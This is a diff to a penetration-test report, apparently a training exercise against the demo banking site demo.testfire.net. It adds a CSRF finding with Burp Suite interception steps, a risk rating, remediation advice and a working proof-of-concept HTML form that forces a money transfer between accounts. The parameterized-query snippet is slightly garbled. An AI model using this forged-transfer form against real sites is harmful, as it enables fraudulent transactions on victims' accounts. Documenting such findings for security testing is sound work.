@@ -82,18 +82,61 @@ Connect the forward proxy with  the burp-suit into the search then try to test t
 
 * Use parameterized query
 
-```String login = request.getParameter("UserName","Password");
+```
+String login = request.getParameter("UserName","Password");
 String query = "SELECT login FROM user_data WHERE user_name = ? ";  
 PreparedStatement pstmt = connection.prepareStatement( query );
 pstmt.setString( 1, user_data);
-ResultSet results = pstmt.executeQuery( );```
+ResultSet results = pstmt.executeQuery( );
+```
+
+## Test Statement:
+We try to intercept the request and try to some illegal activity. Following step below:
+
+![image](https://user-images.githubusercontent.com/65080702/178192032-844a173c-2cca-4171-9b5c-6d2179ab32e7.png)
+
+|**Tools used:**|Brup-suit|
+| :- | :- |
+|<p>**Risk Rating:**  </p><p></p>|<p>**HIGH** </p><p></p>|
+|<p>**Attack Type:**</p><p></p>|<p>**CSRF**</p><p></p>|
 
 ## Test Statement:
 
-We try to intercept some unethical tranction into the website. So, we follow below step:
+* intecept the request from burpsuite 
 
-![Screenshot 2022-07-11 015644](https://user-images.githubusercontent.com/65080702/178191096-d0ac91bb-ede8-4369-97d9-3bd9e7ebed72.jpg)
+![image](https://user-images.githubusercontent.com/65080702/178192315-0c8de973-366b-4194-9f37-5145f876cd9a.png)
 
+* response got from the tool with manupulation:
 
+![image](https://user-images.githubusercontent.com/65080702/178192454-99ac7508-29eb-48b1-930b-dcc6871de743.png)
+
+## POC:
+```
+<html>
+	<body>
+		<form method="POST" action="http://demo.testfire.net/bank/doTransfer">
+			<input type="hidden" name="fromAccount" value="800001"/>
+			<input type="hidden" name="toAccount" value="800000"/>
+			<input type="hidden" name="transferAmount" value="25000"/>
+			<input type="hidden" name="transfer" value="Transfer+Money"/>
+			<input type="submit" value="Submit">
+		</form>
+	</body>
+<html>
+```
+
+## Response:
+
+we got a postive respose into the website which is a threat of the user: 
+
+![image](https://user-images.githubusercontent.com/65080702/178192848-0a6605b6-f9d8-43c3-beda-2ab5cf5dc62d.png)
+
+## Remediation:
+
+* provide the session id with time expire limit.
+* Use uniqe session id for every time login.
+* The application compares the token generated and stored by the application with the token sent in the request
+* If these tokens match, the request is valid
+* If these tokens do not match, the request is invalid and is rejected
 
 
